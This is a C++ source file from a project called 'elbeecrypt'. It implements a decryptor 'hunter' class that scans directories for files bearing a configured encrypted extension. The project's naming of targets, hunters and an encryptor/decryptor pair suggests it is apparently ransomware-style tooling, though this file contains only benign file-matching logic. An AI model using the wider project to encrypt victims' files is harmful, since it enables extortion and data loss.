#include <regex>
#include "elbeecrypt/common/settings.hpp"
#include "elbeecrypt/common/targets/extensions.hpp"
#include "elbeecrypt/common/utils/string.hpp"
#include "elbeecrypt/decryptor/hunter-decryptor.hpp"

/** Impl of hunter-decryptor.hpp */
namespace elbeecrypt::decryptor {
	//Include namespace definitions
	using namespace elbeecrypt::common;

	//Constructors & Destructor
	/** Impl of HunterDecryptor(path). */
	HunterDecryptor::HunterDecryptor(const std::vector<fs::path>& roots): Hunter(roots){
		//Scan the given directories for targets
		hunt(roots);
	}


	//Overrides
	/** Impl of isTargetable(path, uint32_t). */
	bool HunterDecryptor::isTargetable(const fs::path& path, const uint32_t&){ //Depth is not used when decrypting
		//Isolate the extension from the path
		std::string isolatedExt = targets::Extensions::isolateExtension(path);

		//Check if the extension matches the encrypted one
		return utils::String::toLowercase(isolatedExt) == Settings::ENCRYPTED_EXTENSION;
	}

	/** Impl of toString(). */
	std::string HunterDecryptor::toString(){
		//Very lazy lol
		std::string toStr = Hunter::toString();
		return std::regex_replace(toStr, std::regex("Hunter"), "HunterDecryptor");
	}
}